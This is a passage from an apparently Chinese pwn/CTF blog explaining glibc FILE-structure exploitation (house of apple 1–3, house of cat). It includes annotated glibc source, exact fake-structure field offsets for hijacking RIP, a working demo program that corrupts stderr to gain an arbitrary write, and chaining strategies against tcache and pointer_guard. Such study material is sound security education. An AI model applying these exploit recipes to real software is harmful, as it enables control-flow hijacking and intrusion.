<li><code>_IO_wdefault_xsgetn</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">          <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">          <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">        *s++ = *p++;</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure></div> 满足条件：</li>
</ol>
<ul>
<li>由于<code>more</code>是第三个参数，所以不能为<code>0</code>，即<code>rdx</code>寄存器不为<code>0</code></li>
<li>直接设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end</code>，使得<code>count</code>为<code>0</code>，不进入<code>if</code>分支</li>
</ul>
<ol start="2" type="1">
<li><code>__wunderflow</code></li>
</ol>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>满足条件： * 设置<code>fp-&gt;mode &gt; 0</code>，并且<code>fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code></p>
<ol start="3" type="1">
<li><code>_IO_switch_to_wget_mode</code></li>
</ol>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>满足条件： * <code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></p>
<ol start="4" type="1">
<li><p><code>_IO_WOVERFLOW</code></p></li>
<li><p><code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</code></p></li>
</ol>
<p>综上所述： * <code>_flags</code>设置为<code>0x800</code> * <code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可 * <code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code> * <code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code> * <code>_wide_data-&gt;_IO_read_ptr == _wide_data-&gt;_IO_read_end</code>，即满足<code>*A == *(A + 8)</code> * <code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code> * <code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code> * <code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></p>
<h4 id="io_wfile_seekoffhouse-of-cat"><code>_IO_wfile_seekoff(house of cat)</code></h4>
<ul>
<li>调用链</li>
</ul>
<ol type="1">
<li><code>_IO_wfile_seekoff</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span> </span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode) &#123; </span><br><span class="line">	<span class="type">off64_t</span> result; </span><br><span class="line">	<span class="type">off64_t</span> delta, new_offset; </span><br><span class="line">	<span class="type">long</span> <span class="type">int</span> count; </span><br><span class="line">	<span class="comment">/*短路变成一个单独的功能。 我们不想混合任何功能，也不想触及 FILE 对象内部的任何内容。*/</span> </span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">0</span>) </span><br><span class="line">		<span class="keyword">return</span> do_ftell_wide (fp); </span><br><span class="line">		</span><br><span class="line">	...</span><br><span class="line">	<span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) || _IO_in_put_mode (fp)); </span><br><span class="line">	<span class="comment">/*刷新未写入的字符。（如果我们在缓冲区内查找，这可能会执行不必要的写入。但是为了能够切换到阅读，我们需要将 egptr 设置为 pptr。 这在当前的设计中是无法做到的，它假设 file_ptr（） 是 eGptr。 无论如何，由于我们可能在close()时最终刷新，因此没有太大区别。FIXME：模拟内存映射文件。*/</span> </span><br><span class="line">	<span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp)) </span><br><span class="line">		<span class="keyword">return</span> WEOF;</span><br></pre></td></tr></table></figure></div> 满足条件：</li>
</ol>
<ul>
<li><code>_mode</code>不为<code>0</code></li>
<li><code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>或 <code>(fp)-&gt;_flags &amp; 0x0800 != 0</code></li>
</ul>
<ol start="2" type="1">
<li><code>_IO_switch_to_wget_mode</code> 满足条件：</li>
</ol>
<ul>
<li><code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></li>
</ul>
<ol start="3" type="1">
<li><p><code>_IO_WOVERFLOW</code></p></li>
<li><p><code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</code></p></li>
</ol>
<p>综上所述： * <code>_flags</code>设置为<code>~0x8</code>，如果不能保证<code>_lock</code>指向可读写内存则<code>_flags |= 0x8000</code> * <code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_seekoff</code>即可 * <code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code> * <code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code> * <code>_wide_data-&gt;_IO_read_ptr &gt; _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt; *(A + 8)</code> * <code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code> * <code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code> * <code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></p>
<h3 id="house-of-apple1">house of apple1</h3>
<ul>
<li>核心：在堆上伪造一个<code>_IO_FILE</code>结构体并已知其地址为<code>A</code>，将<code>A + 0xd8(vtable)</code>替换为<code>_IO_wstrn_jumps</code>地址，<code>A + 0xa0(_wide_data)</code>设置为<code>B</code>，并设置其他成员以便能调用到<code>_IO_OVERFLOW</code>，<code>exit</code>函数则会一路调用到<code>_IO_wstrn_overflow</code>函数，并将<code>B</code>至<code>B + 0x30</code>的地址区域的内容都替换为<code>A + 0xf0</code>或者<code>A + 0x1f0</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">         snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//只要控制了fp-&gt;_wide_data，就可以控制从fp-&gt;_wide_data开始一定范围内的内存的值，也就等同于任意地址写已知地址。</span></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">                      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                     / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>有时候需要绕过<code>_IO_wsetb</code>函数里面的<code>free</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FLAGS2_USER_WBUF 8</span></span><br><span class="line"><span class="comment">//设置f-&gt;_flags2为8即可绕过</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base); <span class="comment">// 其不为0的时候不要执行到这里</span></span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><code>demo</code>： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">2.35</span><span class="number">-0u</span>buntu3</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="type">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *)puts_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_write_ptr_addr = puts_addr + <span class="number">0x1997f8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_flags2_addr = puts_addr + <span class="number">0x199844</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_wide_data_addr = puts_addr + <span class="number">0x199870</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="type">size_t</span> sdterr_vtable_addr = puts_addr + <span class="number">0x1998a8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="type">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = puts_addr + <span class="number">0x194ef0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_write_ptr_addr = (<span class="type">size_t</span>)<span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_wide_data_addr = (<span class="type">size_t</span>)p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)sdterr_vtable_addr = (<span class="type">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 输出结果： <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[*] allocate a 0x100 chunk</span><br><span class="line">===========================old value=======================</span><br><span class="line">[0x56142e11b2a0]: 0x1122334455667788  0x1122334455667788</span><br><span class="line">[0x56142e11b2b0]: 0x1122334455667788  0x1122334455667788</span><br><span class="line">[0x56142e11b2c0]: 0x1122334455667788  0x1122334455667788</span><br><span class="line">[0x56142e11b2d0]: 0x1122334455667788  0x1122334455667788</span><br><span class="line">===========================old value=======================</span><br><span class="line">[*] puts address: 0x7cb7d0280ed0</span><br><span class="line">[*] stderr-&gt;_IO_write_ptr address: 0x7cb7d041a6c8</span><br><span class="line">[*] stderr-&gt;_flags2 address: 0x7cb7d041a714</span><br><span class="line">[*] stderr-&gt;_wide_data address: 0x7cb7d041a740</span><br><span class="line">[*] stderr-&gt;vtable address: 0x7cb7d041a778</span><br><span class="line">[*] _IO_wstrn_jumps address: 0x7cb7d0415dc0</span><br><span class="line">[+] step 1: change stderr-&gt;_IO_write_ptr to -1</span><br><span class="line">[+] step 2: change stderr-&gt;_flags2 to 8</span><br><span class="line">[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk</span><br><span class="line">[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps</span><br><span class="line">[+] step 5: call fcloseall and trigger house of apple</span><br><span class="line">===========================new value=======================</span><br><span class="line">[0x56142e11b2a0]: 0x00007cb7d041a790  0x00007cb7d041a890</span><br><span class="line">[0x56142e11b2b0]: 0x00007cb7d041a790  0x00007cb7d041a790</span><br><span class="line">[0x56142e11b2c0]: 0x00007cb7d041a790  0x00007cb7d041a790</span><br><span class="line">[0x56142e11b2d0]: 0x00007cb7d041a790  0x00007cb7d041a890</span><br><span class="line">===========================new value=======================</span><br></pre></td></tr></table></figure></div></p>
<p>总结：在只给了<code>1</code>次<code>largebin attack</code>的前提下，能利用<code>_IO_wstrn_overflow</code>函数将任意地址空间上的值修改为一个已知地址，并且这个已知地址通常为堆地址。那么，当我们伪造两个甚至多个<code>_IO_FILE</code>结构体，并将这些结构体通过<code>chain</code>字段串联起来就能进行组合利用</p>
<h4 id="修改tcache线程-2.37">修改tcache线程（&lt; 2.37)</h4>
<ul>
<li>伪造至少两个<code>_IO_FILE</code>结构体</li>
<li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>tcache</code>全局变量为已知值，也就控制了<code>tcache bin</code>的分配</li>
<li>第二个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_str_overflow</code>中的<code>malloc</code>函数任意地址分配，并使用<code>memcpy</code>使得能够<strong>任意地址写任意值</strong></li>
<li>利用两次任意地址写任意值修改<code>pointer_guard</code>和<code>IO_accept_foreign_vtables</code>的值绕过<code>_IO_vtable_check</code>函数的检测（或者利用一次任意地址写任意值修改<code>libc.got</code>里面的函数地址，很多<code>IO</code>流函数调用<code>strlen/strcpy/memcpy/memset</code>等都会调到<code>libc.got</code>里面的函数）</li>
<li>利用一个<code>_IO_FILE</code>，随意伪造<code>vtable</code>劫持程序控制流即可</li>
</ul>
<h4 id="修改mp_结构体">修改<code>mp_</code>结构体</h4>
<ul>
<li>伪造至少两个<code>_IO_FILE</code>结构体</li>
<li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>mp_.tcache_bins</code>为很大的值，使得很大的<code>chunk</code>也通过<code>tcachebin</code>去管理</li>
<li>接下来的过程与上面的思路是一样的</li>
</ul>
<h4 id="修改pointer_guard线程变量house-of-emma">修改<code>pointer_guard</code>线程变量+<code>house of emma</code></h4>
<ul>
<li>伪造两个<code>_IO_FILE</code>结构体</li>
<li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>tls</code>结构体<code>pointer_guard</code>的值为已知值</li>
<li>第二个<code>_IO_FILE</code>结构体用来做<code>house of emma</code>利用即可控制程序执行流</li>
</ul>
<h4 id="修改global_max_fast全局变量">修改<code>global_max_fast</code>全局变量</h4>
<p>修改掉这个变量后，直接释放超大的<code>chunk</code>，去覆盖掉<code>point_guard</code>或者<code>tcache</code>变量</p>
<h3 id="house-of-apple3">house of apple3</h3>
<p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。该结构体参与宽字符的转换工作，结构体相关定义如下： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 